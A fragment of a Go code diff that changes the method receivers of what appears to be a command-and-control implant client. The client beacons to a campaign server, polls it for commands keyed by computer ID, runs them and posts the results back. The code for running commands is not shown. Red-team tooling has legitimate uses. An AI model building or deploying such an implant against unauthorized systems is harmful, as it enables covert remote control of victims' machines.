@@ -37,15 +37,15 @@ func NewClient() Client {
 	return w
 }
 
-func (s Client) CommandGetUrl() string {
+func (s *Client) CommandGetUrl() string {
 	return s.Campaign.ServerUrl + s.Campaign.CommandGetPath + s.Config.ComputerId
 }
 
-func (s Client) CommandSendUrl() string {
+func (s *Client) CommandSendUrl() string {
 	return s.Campaign.ServerUrl + s.Campaign.CommandSendPath
 }
 
-func (s Client) HttpGet(url string) (*http.Response, error) {
+func (s *Client) HttpGet(url string) (*http.Response, error) {
 	client := &http.Client{}
 	req, err := http.NewRequest("GET", url, nil)
 	if err != nil {
@@ -59,7 +59,7 @@ func (s Client) HttpGet(url string) (*http.Response, error) {
 	return res, nil
 }
 
-func (s Client) HttpPost(url string, data *bytes.Reader) (*http.Response, error) {
+func (s *Client) HttpPost(url string, data *bytes.Reader) (*http.Response, error) {
 	client := &http.Client{}
 	req, err := http.NewRequest("POST", url, data)
 	if err != nil {
@@ -73,7 +73,7 @@ func (s Client) HttpPost(url string, data *bytes.Reader) (*http.Response, error)
 	return res, nil
 }
 
-func (s Client) Start() {
+func (s *Client) Start() {
 	s.sendPing()
 	for {
 		gotCommand := s.requestAndExecute()
@@ -83,7 +83,7 @@ func (s Client) Start() {
 	}
 }
 
-func (s Client) sendPing() {
+func (s *Client) sendPing() {
 	arguments := make(model.CmdArgument)
 	arguments["msg"] = "ooy!"
 	response := make(model.CmdResponse)
@@ -91,7 +91,7 @@ func (s Client) sendPing() {
 	s.sendCommand(command)
 }
 
-func (s Client) requestAndExecute() bool {
+func (s *Client) requestAndExecute() bool {
 	command, err := s.GetCommand()
 	if err != nil {
 		if err == ErrNoCommandsFound {
@@ -125,7 +125,7 @@ func (s Client) requestAndExecute() bool {
 	return true // got a command
 }
 
-func (s Client) GetCommand() (model.CommandBase, error) {
+func (s *Client) GetCommand() (model.CommandBase, error) {
 	url := s.CommandGetUrl()
 	resp, err := s.HttpGet(url)
 	if err != nil {
@@ -150,7 +150,7 @@ func (s Client) GetCommand() (model.CommandBase, error) {
 	return command, nil
 }
 
-func (s Client) sendCommand(command model.CommandBase) error {
+func (s *Client) sendCommand(command model.CommandBase) error {
 	url := s.CommandSendUrl()
 
 	// Setup response
